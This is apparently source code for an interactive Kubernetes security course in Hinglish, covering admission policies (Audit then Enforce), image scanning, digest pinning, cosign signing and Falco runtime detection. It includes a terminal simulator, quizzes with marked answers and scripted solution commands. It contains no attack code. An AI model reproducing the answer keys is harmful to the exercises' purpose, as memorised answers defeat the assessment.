       <p><b>Auzaar 2 — ValidatingAdmissionPolicy:</b> Kubernetes ke andar hi bana hua (v1.30 se stable). Kuch install nahi karna. Niyam CEL bhasha mein:</p>
       <pre>validations:
  - expression: "object.spec.template.spec.containers.all(c, !c.image.endsWith(':latest'))"
    message: "image ka tag latest nahi ho sakta"</pre>`,
      `<h3>🚦 Audit pehle, Enforce baad mein</h3>
       <p>Nayi policy ko seedha <b>Enforce</b> (roko) mein daaloge toh production ke chalte hue apps ka agla deploy toot sakta hai.</p>
       <ol>
         <li><b>Audit</b> mein daalo: policy kisi ko nahi rokti, sirf <b>likhti</b> hai ki kaun niyam tod raha hai.</li>
         <li><b>Report padho</b> (<code>kubectl get policyreport</code>): kitne workloads fail hain?</li>
         <li>Un workloads ko <b>theek karo</b>.</li>
         <li>Report mein fail = 0 → ab <b>Enforce</b>.</li>
       </ol>
       <p><b>Block hone par error kaisa dikhta hai:</b></p>
       <pre>Error from server: admission webhook "validate.kyverno.svc-fail" denied the request:
resource Deployment/payments/pay-api was blocked due to the following policies
disallow-latest-tag:
  require-image-tag: 'validation error: An image tag is required and must not be latest.'</pre>
       <p>Error mein <b>policy ka naam</b> aur <b>wajah</b> dono hote hain. Sahi jawab: apna YAML theek karo — policy ko band karna nahi.</p>`,
    ],
    stages: [
      {
        type: 'bins',
        title: 'Validate, mutate ya generate?',
        instructions: 'Har zaroorat ke liye socho: rokna hai, badalna hai, ya saath mein kuch naya banana hai?',
        bins: [
          { id: 'val', label: '🛂 Validate (haan / na)' },
          { id: 'mut', label: '✏️ Mutate (badal do)' },
          { id: 'gen', label: '🧬 Generate (naya bana do)' },
        ],
        items: [
          { text: 'privileged: true wale pod ko banne hi mat do', bin: 'val', explain: 'Yahan theek karne layak kuch nahi — seedha mana karna hai. Validate.' },
          { text: 'Har naye namespace mein apne aap ek default-deny NetworkPolicy ban jaye', bin: 'gen', explain: 'Ek object (Namespace) banne par doosra object (NetworkPolicy) banana = generate.' },
          { text: 'Jis pod mein seccompProfile nahi likha, usme RuntimeDefault jod do', bin: 'mut', explain: 'Developer ko rokna nahi, uski chhooti hui cheez bhar deni hai. Mutate.' },
          { text: 'Image sirf registry.chaipay.in se aaye, kisi aur registry se nahi', bin: 'val', explain: 'Bahar ki registry ki image ko mana karna hai. Validate.' },
          { text: 'Har pod par label team=payments apne aap lag jaye agar namespace payments hai', bin: 'mut', explain: 'Request mein label jodna = badalna. Mutate.' },
          { text: 'Har naye namespace ko apne aap ek ResourceQuota mile', bin: 'gen', explain: 'Namespace ke saath naya object (ResourceQuota) banta hai. Generate.' },
        ],
      },
      {
        type: 'terminal',
        title: '🖥️ Mission: deploy block ho gaya — aur ek policy ko Enforce karna hai',
        instructions: 'Do kaam. Pehle: pay-api ka naya version deploy nahi ho raha. Doosra: security team chahti hai ki "har workload mein requests hon" wali policy Enforce ho.',
        goal: `<b>Kaam 1:</b> <code>pay-api-v4.yaml</code> deploy karo. Block ho toh error padho aur <b>YAML</b> theek karo — policy ko mat chhedo.<br>
          <b>Kaam 2:</b> policy <code>require-requests</code> abhi <b>Audit</b> mein hai. Use <b>Enforce</b> mein daalo — par is tarah ki kisi chalte workload ka agla deploy na toote.`,
        tasks: T_POLICY,
        cluster: {
          nodes: [{ name: 'node-1', status: 'Ready', roles: '<none>', age: '40d', version: 'v1.33.4' }],
          pods: [
            { name: 'pay-api-6b8d7c-a1', ready: '1/1', status: 'Running', restarts: 0, age: '6d', node: 'node-1', ip: '10.244.1.20' },
            { name: 'notify-5c9d4f-k3', ready: '1/1', status: 'Running', restarts: 0, age: '6d', node: 'node-1', ip: '10.244.1.21' },
            { name: 'fraud-check-8d7f6c-m2', ready: '1/1', status: 'Running', restarts: 0, age: '6d', node: 'node-1', ip: '10.244.1.23' },
          ],
          deployments: [
            { name: 'pay-api', ready: '1/1', upToDate: 1, available: 1, age: '40d' },
            { name: 'notify', ready: '1/1', upToDate: 1, available: 1, age: '40d' },
            { name: 'fraud-check', ready: '1/1', upToDate: 1, available: 1, age: '40d' },
          ],
          custom: {
            clusterpolicy: { names: ['clusterpolicy', 'clusterpolicies', 'cpol'], cols: ['NAME', 'ADMISSION', 'BACKGROUND', 'VALIDATE ACTION', 'READY', 'AGE'],
              items: [
                { name: 'disallow-latest-tag', row: ['true', 'true', 'Enforce', 'True', '30d'],
                  describe: 'Name:  disallow-latest-tag\nSpec:\n  Validation Failure Action:  Enforce\n  Rules:\n    Name:  require-image-tag\n    Validate:\n      Message:  An image tag is required and must not be latest.\n      Pattern:  image: "!*:latest"' },
                { name: 'require-requests', row: ['true', 'true', 'Audit', 'True', '9d'],
                  describe: 'Name:  require-requests\nSpec:\n  Validation Failure Action:  Audit      <-- abhi sirf likhta hai, rokta nahi\n  Rules:\n    Name:  check-requests\n    Validate:\n      Message:  CPU and memory requests are required.' },
              ] },
            policyreport: { names: ['policyreport', 'policyreports', 'polr'], cols: ['NAME', 'KIND', 'PASS', 'FAIL', 'AGE'],
              items: [{ name: 'cpol-require-requests', row: ['ClusterPolicy', '2', '3', '9d'], describe: s => polReport(s.cluster) }] },
          },
        },
        responses: [
          { re: /^kubectl delete (clusterpolic(y|ies)|cpol)\b/, err: true, out: '(simulator ne roka) Policy delete karne se tumhara deploy chal jayega — aur kal koi aur bhi latest tag deploy kar payega. Policy sahi hai; galti YAML mein hai.' },
        ],
        files: {
          'pay-api-v4.yaml': {
            desc: 'pay-api ka naya version (developer ka likha hua)',
            content: 'apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: pay-api\n  namespace: payments\nspec:\n  template:\n    spec:\n      containers:\n        - name: pay-api\n          image: chaipay/pay-api:latest        # <-- dhyaan do\n          resources:\n            requests: { cpu: 500m, memory: 1Gi }',
            apply: s => {
              s.cluster.sawBlock = true;
              return 'Error from server: error when applying patch: admission webhook "validate.kyverno.svc-fail" denied the request:\n\nresource Deployment/payments/pay-api was blocked due to the following policies\n\ndisallow-latest-tag:\n  autogen-require-image-tag: \'validation error: An image tag is required and must not be latest. rule autogen-require-image-tag failed at path /spec/template/spec/containers/0/image/\'\n(error mein policy ka naam aur wajah dono likhe hain. Deployment banne se PEHLE roka gaya — purana pay-api chal raha hai.)';
            },
          },
          'pay-api-v4-pinned.yaml': {
            desc: 'Wahi Deployment, par image: chaipay/pay-api:4.0.1',
            content: 'apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: pay-api\n  namespace: payments\nspec:\n  template:\n    spec:\n      containers:\n        - name: pay-api\n          image: chaipay/pay-api:4.0.1         # pakka version\n          resources:\n            requests: { cpu: 500m, memory: 1Gi }',
            apply: s => {
              const c = s.cluster;
              if (c.deployed) return 'deployment.apps/pay-api unchanged';
              c.deployed = true;
              c.pods = c.pods.filter(p => !/^pay-api/.test(p.name));
              c.pods.unshift({ name: 'pay-api-7c9e8d-v4', ready: '1/1', status: 'Running', restarts: 0, age: '20s', node: 'node-1', ip: '10.244.1.40' });
              return 'deployment.apps/pay-api configured\n(policy ne is baar haan kaha: tag 4.0.1 hai. Naya pod Running hai.)';
            },
          },
          'policy-set-audit.sh': {
            desc: 'disallow-latest-tag policy ko Enforce se Audit mein daal deta hai',
            content: '#!/bin/sh\nkubectl patch clusterpolicy disallow-latest-tag --type merge -p \'{"spec":{"validationFailureAction":"Audit"}}\'',
            apply: () => '(simulator ne roka) Policy ko dheela karne se tumhara latest wala deploy chal jayega. Par latest tag ka matlab hai: kal wahi YAML koi doosri image chala sakta hai, aur rollback mein pata nahi kaun sa version wapas aayega. Policy theek hai — YAML badlo.',
          },
          'fix-violators.yaml': {
            desc: 'notify, fraud-check aur nightly-report mein CPU/memory requests jodta hai',
            apply: s => {
              const c = s.cluster;
              c.violFixed = true;
              c.custom.policyreport.items[0].row = ['ClusterPolicy', '5', '0', '9d'];
              return 'deployment.apps/notify configured\ndeployment.apps/fraud-check configured\ncronjob.batch/nightly-report configured\n(teeno workloads mein ab requests hain. Policy report: pass 5, fail 0.)';
            },
          },
          'enforce-require-requests.yaml': {
            desc: 'require-requests policy ko Audit se Enforce mein daalta hai',
            apply: s => {
              const c = s.cluster;
              if (!c.violFixed) return '(simulator ne roka) Policy report abhi 3 fail dikha rahi hai: notify, fraud-check, nightly-report. Abhi Enforce karoge toh in teeno ka AGLA deploy block hoga — shayad kisi ghatna ke beech, jab jaldi mein fix deploy karna ho. Pehle violators theek karo (report padho: kubectl describe policyreport cpol-require-requests).';
              c.enforced = true;
              const p = c.custom.clusterpolicy.items.find(x => x.name === 'require-requests');
              p.row = ['true', 'true', 'Enforce', 'True', '9d'];
              p.describe = 'Name:  require-requests\nSpec:\n  Validation Failure Action:  Enforce\n  Rules:\n    Name:  check-requests\n    Validate:\n      Message:  CPU and memory requests are required.';
              return 'clusterpolicy.kyverno.io/require-requests configured\n(ab bina requests wala koi naya workload cluster mein nahi aa sakta. Koi chalta workload nahi toota — kyunki report pehle hi 0 fail par thi.)';
            },
          },
        },
        success: KG.allOf(T_POLICY),
        successText: `<b>Kaam 1:</b> error ne khud bataya — policy <code>disallow-latest-tag</code>, wajah "must not be latest". Tumne policy nahi, <b>YAML</b> theek kiya.<br>
          <b>Kaam 2:</b> tumne <b>report pehle padhi</b>: 3 workloads niyam tod rahe the. Seedha Enforce karte toh un teeno ka agla deploy toot-ta. Kram: Audit → report → violators theek → Enforce.<br>
          <b>Yaad rakho:</b> policy ka maqsad logon ko rokna nahi, galti ko <i>jaldi</i> pakadna hai — deploy ke waqt, ghatna ke waqt nahi.`,
        hints: [
          'kubectl apply -f pay-api-v4.yaml chalao aur error padho. Phir kubectl get clusterpolicy. cat pay-api-v4.yaml mein image ki line dekho.',
          'kubectl apply -f pay-api-v4-pinned.yaml. Phir Audit wali policy ki report: kubectl get policyreport, kubectl describe policyreport cpol-require-requests.',
          'Pehle kubectl apply -f fix-violators.yaml, phir kubectl apply -f enforce-require-requests.yaml. Ulta kram simulator rok dega.',
        ],
        solution: [
          'kubectl apply -f pay-api-v4.yaml',
          'kubectl get clusterpolicy',
          'cat pay-api-v4.yaml',
          'kubectl apply -f pay-api-v4-pinned.yaml',
          'kubectl get policyreport',
          'kubectl describe policyreport cpol-require-requests',
          'kubectl apply -f fix-violators.yaml',
          'kubectl apply -f enforce-require-requests.yaml',
        ],
      },
      {
        type: 'quiz',
        title: 'Pakka karo — policy ka bartaav',
        questions: [
          {
            q: 'Ek policy Audit mode mein hai. Ek developer niyam todne wala Deployment apply karta hai. Kya hoga?',
            choices: [
              'Deployment block hoga aur developer ko error milega',
              'Deployment ban jayega; report mein ek "fail" likha jayega',
              'Deployment banega par uske pods start nahi honge',
              'Policy Deployment ko apne aap theek karke bana degi',
            ],
            answer: 1,
            explain: 'Audit = sirf likhna. Kuch block nahi hota. Isi liye Audit nayi policy ki surakshit shuruaat hai: pehle dekho ki kitna tootega, phir Enforce karo.',
          },
          {
            q: 'Request par mutate aur validate dono policies lagti hain. Kaun pehle chalti hai, aur kyun?',
            choices: [
              'Validate pehle — taaki galat request par mutate ka kaam barbaad na ho',
              'Dono ek saath — API Server unhe parallel chalata hai',
              'Mutate pehle — taaki validate request ke aakhri roop ko jaanche',
              'Jo policy pehle bani thi woh pehle chalti hai',
            ],
            answer: 2,
            explain: 'Kram: mutate → validate. Agar validate pehle chalta, toh woh us cheez ko mana kar deta jise mutate abhi theek karne wala tha (ya mutate ke baad ki galti pakad hi nahi pata).',
          },
        ],
      },
    ],
    interview: {
      title: 'Interview Round — policy as code',
      instructions: 'Platform / security engineer ke interview ka aam hissa. 🎤',
      questions: [
        {
          q: '"RBAC hai toh admission policy ki zaroorat kyun?"',
          choices: [
            'RBAC sirf insaanon par lagta hai; ServiceAccounts ke liye admission policy chahiye',
            'RBAC batata hai kaun kya bana sakta hai; policy batati hai ki bana hua object kaisa hona chahiye',
            'RBAC dheema hai; admission policy wahi kaam tezi se karti hai',
            'Zaroorat nahi — RBAC mein image tag aur securityContext ke niyam bhi likhe ja sakte hain',
          ],
          answer: 1,
          explain: 'RBAC ka sawal: "kaun, kaun sa kaam, kis object par". RBAC object ke andar nahi dekhta. "Deployment bana sakte ho, par root nahi chalega" — yeh andar ka niyam hai, aur yeh admission policy ka kaam hai.',
        },
        {
          q: '"Production cluster mein ek nayi policy kaise laate ho?"',
          choices: [
            'Seedha Enforce mein — jitni jaldi niyam lage utna achha',
            'Pehle dev cluster mein Enforce; production mein policy ki zaroorat nahi hoti',
            'Audit mein daalta hoon, report se violators theek karta hoon, phir Enforce',
            'Policy ko sirf naye namespaces par lagata hoon; purane namespaces ko hamesha chhoot',
          ],
          answer: 2,
          explain: 'Audit → report → fix → Enforce. Seedha Enforce ka khatra: chalte apps ka agla deploy block — aur aksar tab pata chalta hai jab ghatna ke beech jaldi mein fix bhejna ho.',
        },
        {
          q: '"Developer kehta hai: policy ne mera deploy rok diya, policy band kar do. Kya karoge?"',
          choices: [
            'Policy ko us developer ke namespace ke liye band kar dunga taaki kaam na ruke',
            'Error mein policy ka naam aur wajah dekhunga, aur developer ke saath YAML theek karunga',
            'Developer ko cluster-admin de dunga taaki policy us par lagu na ho',
            'Policy ko Audit mein daal dunga aur baad mein kabhi wapas Enforce karunga',
          ],
          answer: 1,
          explain: 'Policy ka error ek saaf sandesh hai: kaun sa niyam, kaun si line. Zyadatar mamlon mein YAML ki ek line badalni hoti hai. Chhoot (exception) dena ho toh woh likhit, seemit aur samay-baddh ho — policy band karna nahi.',
        },
      ],
    },
    success: [
      'Main RBAC aur admission policy ka farak samjha sakta hoon',
      'Main block hue deploy ke error se policy aur wajah nikaal sakta hoon',
      'Main nayi policy ko Audit → report → fix → Enforce ke kram mein la sakta hoon',
    ],
    homework: `<p>Asli cluster par: <b>🧪 Real Lab 19 — ValidatingAdmissionPolicy</b> (kuch install nahi karna; Kubernetes ke andar hi hai).</p>
      <pre>kubectl get validatingadmissionpolicy,validatingadmissionpolicybinding
kubectl get clusterpolicy            # Kyverno laga ho toh
kubectl get policyreport -A          # Audit ke nateeje</pre>`,
    cards: [
      { front: 'RBAC aur admission policy ka farak?', back: '<b>RBAC</b>: kaun kya bana sakta hai. <b>Policy</b>: jo ban raha hai woh kaisa hona chahiye (tag, root, requests…).' },
      { front: 'Policy ke teen kaam?', back: '<b>Validate</b> (haan/na) · <b>Mutate</b> (request badal do) · <b>Generate</b> (saath mein naya object).' },
      { front: 'Nayi policy laane ka surakshit kram?', back: 'Audit → report padho → violators theek → Enforce.' },
      { front: 'Mutate aur validate mein pehle kaun?', back: 'Mutate pehle, validate baad mein — validate request ke aakhri roop ko jaanchta hai.' },
      { front: 'Bina kuch install kiye Kubernetes mein policy?', back: '<b>ValidatingAdmissionPolicy</b> + Binding (v1.30 se stable). Niyam CEL bhasha mein.' },
    ],
  },
]);

/* ------------------------------------------------------------------ */
/* LEVEL 3 — image supply chain                                        */
/* ------------------------------------------------------------------ */
VISUALS['sec-supply'] = {
  t: 'Image ka safar — code se cluster tak, har padav par ek jaanch',
  scene: {
    intro: '<b>Sawal:</b> tumhe kaise pata ki jo image cluster mein chal rahi hai, woh wahi hai jo tumhari team ne banayi thi — aur usme koi jaani-pehchaani kamzori nahi hai?',
    aria: 'image supply chain: build, scan, sign, registry, admission verify, cluster — 6 kadam',
    nodes: [
      { id: 'ci', col: 0, row: 0, icon: '🏗️', label: 'CI: build', sub: 'code → image', about: 'CI pipeline code se container image banati hai. Image ke andar tumhara code + base image + libraries hoti hain.' },
      { id: 'scan', col: 1, row: 0, icon: '🔬', label: 'Scan (Trivy)', sub: 'jaani hui kamzoriyan', tone: 'gold', about: 'Trivy image ke har package ko jaani hui kamzoriyon (CVE) ki list se milata hai. CRITICAL mile toh pipeline rok do.' },
      { id: 'sign', col: 2, row: 0, icon: '✍️', label: 'Sign (cosign)', sub: 'digest par signature', tone: 'accent', about: 'cosign image ke <b>digest</b> par tumhari private key se signature banata hai. Signature registry mein image ke saath rakha jaata hai.' },
      { id: 'reg', col: 2, row: 1, icon: '🏬', label: 'Registry', sub: 'image + signature', about: 'Images ka godown. Tag (jaise 4.0.1) ek chit hai jo badli ja sakti hai. Digest (sha256:…) image ke maal ka fingerprint hai — badal nahi sakta.' },
      { id: 'adm', col: 1, row: 1, icon: '🛂', label: 'Admission: verify', sub: 'signature hai?', tone: 'gold', about: 'Cluster ke darwaze par policy: "sirf woh image chalegi jis par hamari key ka signature hai".' },
      { id: 'k8s', col: 0, row: 1, icon: '☸️', label: 'Cluster', sub: 'pod chalta hai', tone: 'good' },
    ],
    steps: [
      { from: 'ci', to: 'scan', label: 'nayi image', say: '<b>CI: build</b> image banata hai. Push se pehle image <b>Scan (Trivy)</b> ke paas jaati hai.' },
      { at: ['scan'], say: '<b>Scan (Trivy)</b> image ke har package ko jaanchta hai. CRITICAL kamzori mili aur uska fix maujood hai → pipeline yahin ruk jaati hai. Kharab image aage badhti hi nahi.' },
      { from: 'scan', to: 'sign', label: 'saaf hai', tone: 'good', say: 'Scan paas hua. Ab <b>Sign (cosign)</b> image ke <b>digest</b> par signature banata hai. Signature kehta hai: "yeh image ChaiPay ki pipeline se nikli hai".' },
      { from: 'sign', to: 'reg', label: 'image + signature', say: 'Image aur signature dono <b>Registry</b> mein jaate hain. Tag <code>4.0.1</code> ek chit hai; asli pehchaan digest <code>sha256:9f2c…</code> hai.' },
      { from: 'reg', to: 'adm', label: 'pod maang raha hai', tone: 'gold', say: 'Koi Deployment is image ko maangta hai. <b>Admission: verify</b> registry se signature mangwata hai aur tumhari public key se milata hai.' },
      { from: 'adm', to: 'k8s', label: 'signature sahi', tone: 'good', say: 'Signature sahi hai, toh pod <b>Cluster</b> mein chalta hai. Bina signature wali image — chahe kisi ne registry mein chupke se daal di ho — darwaze par hi ruk jaati hai.' },
    ],
  },
};

const IMG_OLD = 'chaipay/pay-api:4.0.1', IMG_NEW = 'chaipay/pay-api:4.0.1-slim';
const DIG = 'sha256:9f2c41d7', DIG_FULL = 'sha256:9f2c41d7a8e3b6f05c1d2e4a7b9c0d3e5f6a1b2c3d4e5f60718293a4b5c6d7e8';
const T_SUPPLY = [
  { text: `Purani image scan karo: <code>trivy image ${IMG_OLD}</code>`, check: s => !!s.cluster.scannedOld },
  { text: `Nayi slim image scan karo: <code>trivy image ${IMG_NEW}</code>`, check: s => !!s.cluster.scannedNew },
  { text: `Nayi image ka digest nikaalo: <code>crane digest ${IMG_NEW}</code>`, check: s => s.history.some(h => /^crane digest chaipay\/pay-api:4\.0\.1-slim$/.test(h)) },
  { text: 'Image ko <b>digest</b> se sign karo (<code>cosign sign --key cosign.key chaipay/pay-api@sha256:…</code>)', check: s => !!s.cluster.signed },
  { text: 'Signature jaancho (<code>cosign verify --key cosign.pub …</code>)', check: s => !!s.cluster.sigOk },
  { text: 'Digest wala Deployment apply karo', check: s => !!s.cluster.deployed },
];
const trivyOld = `${IMG_OLD} (debian 12.9)\n\nTotal: 7 (HIGH: 5, CRITICAL: 2)\n\n┌──────────┬──────────────────┬──────────┬───────────────────┬───────────────┐\n│ Library  │ Vulnerability    │ Severity │ Installed Version │ Fixed Version │\n├──────────┼──────────────────┼──────────┼───────────────────┼───────────────┤\n│ libssl3  │ CVE-2026-A (misaal) │ CRITICAL │ 3.0.15-1          │ 3.0.17-1      │\n│ zlib1g   │ CVE-2026-B (misaal) │ CRITICAL │ 1:1.2.13          │ 1:1.2.13+deb1 │\n│ libc6    │ CVE-2026-C (misaal) │ HIGH     │ 2.36-9            │ 2.36-9+deb12  │\n│ ...      │ (4 aur HIGH)        │          │                   │               │\n└──────────┴──────────────────┴──────────┴───────────────────┴───────────────┘\n(dhyaan do: saari kamzoriyan pay-api ke code mein nahi, BASE image (debian) ke packages mein hain.\n pay-api in packages ko use bhi nahi karta — par attacker kar sakta hai.)`;
const trivyNew = `${IMG_NEW} (distroless)\n\nTotal: 0 (HIGH: 0, CRITICAL: 0)\n(base image distroless hai: usme shell, package manager aur zyadatar system libraries hain hi nahi.\n Jo cheez image mein nahi hai, usme kamzori bhi nahi nikal sakti.)`;

/* ------------------------------------------------------------------ */
/* LEVEL 4 — runtime detection + incident response                     */
/* ------------------------------------------------------------------ */
VISUALS['sec-runtime'] = {
  t: 'Falco — container ke andar kya ho raha hai, kernel se sunna',
  scene: {
    intro: '<b>Sawal:</b> pod <code>Running</code> hai, probes paas hain, par andar ek attacker crypto miner chala raha hai. Kubernetes ko kuch nahi dikhta. Kaun dekhega?',
    aria: 'Falco ka raasta: container ka syscall, kernel, Falco, rules, alert, on-call — 6 kadam',
    nodes: [
      { id: 'ctr', col: 0, row: 0, icon: '📦', label: 'container: notify', sub: 'andar attacker', tone: 'bad', about: 'Container jo bhi karta hai — file kholna, network connection, naya process — sab Linux kernel se maang kar karta hai.' },
      { id: 'kern', col: 1, row: 0, icon: '🐧', label: 'Linux kernel', sub: 'har kaam yahin se', about: 'Container kernel se har kaam "syscall" ke zariye maangta hai. Jaise naya process chalana = <code>execve</code>.' },
      { id: 'falco', col: 2, row: 0, icon: '🦅', label: 'Falco', sub: 'syscalls sunta hai', tone: 'accent', about: 'Falco har node par chalta hai (DaemonSet). Falco eBPF se kernel ke syscalls sunta hai — container ko pata bhi nahi chalta.' },
      { id: 'rules', col: 2, row: 1, icon: '📋', label: 'Rules', sub: '"container mein shell"', tone: 'gold', about: 'Niyam jo batate hain kya ajeeb hai: container mein shell khulna, /etc mein likhna, mining pool ke port par connection.' },
      { id: 'alert', col: 1, row: 1, icon: '📟', label: 'Alert', sub: 'Slack / pager', tone: 'bad' },
      { id: 'you', col: 0, row: 1, icon: '🧑‍🚒', label: 'On-call (tum)', sub: 'jawab dena hai', about: 'Falco sirf batata hai. Rokna aur saaf karna insaan (ya automation) ka kaam hai.' },
    ],
    steps: [
      { from: 'ctr', to: 'kern', label: 'execve("sh")', tone: 'bad', say: 'Attacker <b>container: notify</b> ke andar ek shell chalata hai. Shell chalana bhi ek syscall hai: container <b>Linux kernel</b> se kehta hai "yeh naya process chalao".' },
      { from: 'kern', to: 'falco', label: 'syscall ki khabar', say: '<b>Falco</b> eBPF ke zariye <b>Linux kernel</b> ke har syscall ki khabar sunta hai. Container ke andar kuch install nahi hai; attacker Falco ko dekh ya band nahi kar sakta.' },
      { from: 'falco', to: 'rules', label: 'niyam se milao', tone: 'gold', say: '<b>Falco</b> is khabar ko <b>Rules</b> se milata hai. Niyam: "production container ke andar shell nahi khulna chahiye". Match ho gaya.' },
      { from: 'falco', to: 'alert', label: 'alert', tone: 'bad', bend: -30, say: '<b>Falco</b> ek <b>Alert</b> bhejta hai: kaun sa pod, kaun sa container, kaun sa command, kis samay.' },
      { from: 'alert', to: 'you', label: 'page', tone: 'bad', say: '<b>On-call (tum)</b> ko page milta hai. Falco ka kaam yahin khatam.' },
      { at: ['falco', 'you'], say: 'Dhyaan do: <b>Falco</b> sirf <b>batata</b> hai, rokta nahi. Rokna do jagah hota hai: pehle (admission policy, least privilege) aur baad mein (tumhara jawab: alag karo → saboot → raaz badlo → wajah band karo).' },
    ],
  },
};

KG.registerLevels('secure', [
  /* ================================================================== */
  {
    id: 'sec-supply',
    icon: '📦',
    title: 'Image Supply Chain — scan, sign, aur tag nahi digest',
    badge: 'Image Inspector',
    objectives: [
      'Image ke andar tumhare code se zyada <b>doosron ka</b> maal hota hai',
      '<b>Scan</b>: jaani hui kamzoriyan pakadna (Trivy), aur CI mein rokna',
      '<b>Tag</b> badal sakta hai, <b>digest</b> nahi',
      '<b>Sign + verify</b>: cluster sirf apni pipeline ki image chalaye (terminal)',
    ],
    lesson: [
      `<h3>🥫 Misaal: dibbe ka khana</h3>
       <p>Tum ek restaurant chalate ho. Tumhari recipe tumhari hai — par tel, masale, aata <b>bahar se</b> aate hain.
       Kisi ek cheez mein milawat hui toh poora khana kharab.</p>
       <p>Container image bhi aisi hi hai:</p>
       <pre>tumhara code            ~5%
tumhari libraries       ~25%
base image (debian…)    ~70%   ← yeh tumne likha hi nahi</pre>
       <p><b>Teen khatre:</b></p>
       <ul>
         <li>Base image ya library mein <b>jaani hui kamzori</b> (CVE) hai.</li>
         <li>Tag wahi hai, par peeche ki image <b>badal</b> di gayi.</li>
         <li>Koi <b>bahar ki image</b> cluster mein chala deta hai.</li>
       </ul>
       <p>Har khatre ka ek jawab hai: <b>scan</b>, <b>digest</b>, <b>signature</b>.</p>`,
      `<h3>🔬 Scan + 🏷️ digest</h3>
       <pre>trivy image chaipay/pay-api:4.0.1
# CI mein darwaza: CRITICAL ya HIGH (jiska fix hai) mile toh pipeline fail
trivy image --severity HIGH,CRITICAL --ignore-unfixed --exit-code 1 IMAGE</pre>
       <p><b>Sabse sasta ilaaj:</b> chhoti base image (distroless / slim). Jo package image mein nahi hai, usme kamzori nahi nikal sakti.</p>
       <p><b>Tag vs digest:</b></p>
       <table>
         <tr><th></th><th>Tag</th><th>Digest</th></tr>
         <tr><td>Dikhta kaisa hai</td><td><code>pay-api:4.0.1</code></td><td><code>pay-api@sha256:9f2c41d7…</code></td></tr>
         <tr><td>Kya hai</td><td>Ek chit — koi bhi nayi image par chipka sakta hai</td><td>Image ke maal ka fingerprint</td></tr>
         <tr><td>Badal sakta hai?</td><td>✅ haan</td><td>❌ nahi</td></tr>
       </table>
       <p><b>Asli baat:</b> production mein image ko <b>digest</b> se likho. Tab kal aur aaj ek hi image chalegi — pakka.</p>`,
      `<h3>✍️ Signature: "yeh image hamari hai"</h3>
       <pre># CI mein, scan paas hone ke baad — digest par sign
cosign sign --key cosign.key chaipay/pay-api@sha256:9f2c41d7…

# kahin bhi jaanch
cosign verify --key cosign.pub chaipay/pay-api@sha256:9f2c41d7…</pre>
       <p>Private key (<code>cosign.key</code>) sirf CI ke paas hoti hai. Public key (<code>cosign.pub</code>) kisi ko bhi di ja sakti hai.</p>
       <p><b>Cluster ke darwaze par:</b> ek admission policy (Kyverno ka <code>verifyImages</code>) har image ka signature jaanchti hai.
       Signature nahi → pod nahi.</p>
       <p><b>SBOM</b> = image ke andar ke saare packages ki list ("samagri ki soochi"). Kal koi nayi badi kamzori nikle,
       toh SBOM se ek minute mein pata chalta hai ki tumhari kaun-kaun si images mein woh package hai.</p>`,
    ],
    stages: [
      {
        type: 'order',
        title: 'Surakshit pipeline ka kram banao',
        instructions: 'Code likhne se lekar pod chalne tak — padav sahi kram mein lagao.',
        steps: [
          { text: 'CI code se image banata hai (chhoti base image par)', explain: 'Sab kuch yahin se shuru. Chhoti base image = kam packages = kam kamzoriyan.' },
          { text: 'Trivy image ko scan karta hai; CRITICAL mile toh pipeline ruk jaati hai', explain: 'Scan sign se PEHLE. Kharab image par signature lagana kharab image ko "bharosemand" bana deta.' },
          { text: 'cosign image ke digest par signature banata hai', explain: 'Signature digest par hota hai, tag par nahi — tag kal kisi aur image par ja sakta hai.' },
          { text: 'Image aur signature registry mein push hote hain', explain: 'Signature image ke saath registry mein rehta hai, isliye koi bhi baad mein jaanch sakta hai.' },
          { text: 'Deployment ke YAML mein image digest se likhi jaati hai', explain: 'Ab YAML hamesha usi ek image ki taraf ishaara karta hai jo scan aur sign hui thi.' },
          { text: 'Admission policy signature jaanchti hai, phir pod chalta hai', explain: 'Aakhri darwaza. Pipeline ke bahar se aayi image yahan ruk jaati hai.' },
        ],
      },
      {
        type: 'terminal',
        title: '🖥️ Mission: release ka darwaza',
        instructions: 'pay-api 4.0.1 release hona hai. Security scan mein purani image fail ho gayi. Team ne ek slim image banayi hai. Use release-layak banao.',
        goal: `Cluster mein ek policy hai: <b>sirf ChaiPay ki key se sign hui image chalegi</b>. Purani aur nayi image scan karo, nayi image ko <b>digest se</b> sign karo, signature jaancho, aur digest wala Deployment apply karo.<br>
          (Simulator mein digest ke pehle 8 akshar kaafi hain: <code>chaipay/pay-api@${DIG}</code>. Asli digest 64 akshar ka hota hai.)`,
        tasks: T_SUPPLY,
        cluster: {
          nodes: [{ name: 'node-1', status: 'Ready', roles: '<none>', age: '40d', version: 'v1.33.4' }],
          pods: [{ name: 'pay-api-6b8d7c-a1', ready: '1/1', status: 'Running', restarts: 0, age: '6d', node: 'node-1', ip: '10.244.1.20' }],
          deployments: [{ name: 'pay-api', ready: '1/1', upToDate: 1, available: 1, age: '40d' }],
          custom: {
            clusterpolicy: { names: ['clusterpolicy', 'clusterpolicies', 'cpol'], cols: ['NAME', 'ADMISSION', 'BACKGROUND', 'VALIDATE ACTION', 'READY', 'AGE'],
              items: [{ name: 'verify-image-signature', row: ['true', 'false', 'Enforce', 'True', '30d'],
                describe: 'Name:  verify-image-signature\nSpec:\n  Validation Failure Action:  Enforce\n  Rules:\n    Name:  check-chaipay-signature\n    Verify Images:\n      Image References:  chaipay/*\n      Attestors:  public key (cosign.pub)\n(sirf woh chaipay/* image chalegi jis par ChaiPay ki key ka signature hai)' }] },
          },
        },
        responses: [
          { re: /^trivy image( --\S+( \S+)?)* chaipay\/pay-api:4\.0\.1$/, mutate: s => { s.cluster.scannedOld = true; }, out: trivyOld },
          { re: /^trivy image( --\S+( \S+)?)* chaipay\/pay-api:4\.0\.1-slim$/, mutate: s => { s.cluster.scannedNew = true; }, out: trivyNew },
          { re: /^trivy\b/, err: true, out: `Is mission mein trivy ke yeh do commands chalte hain:\n  trivy image ${IMG_OLD}\n  trivy image ${IMG_NEW}` },
          { re: /^crane digest chaipay\/pay-api:4\.0\.1-slim$/, out: DIG_FULL + '\n(yahi image ka fingerprint hai. Simulator mein pehle 8 akshar kaafi hain: ' + DIG + ')' },
          { re: /^crane digest chaipay\/pay-api:4\.0\.1$/, out: 'sha256:1b7e09c4f2a6d8e3b5c7091a2d4f6e8b0c1d3e5f7a9b2c4d6e8f0a1b3c5d7e9f\n(yeh PURANI image ka digest hai — jisme 2 CRITICAL kamzoriyan hain. Is par sign mat karna.)' },
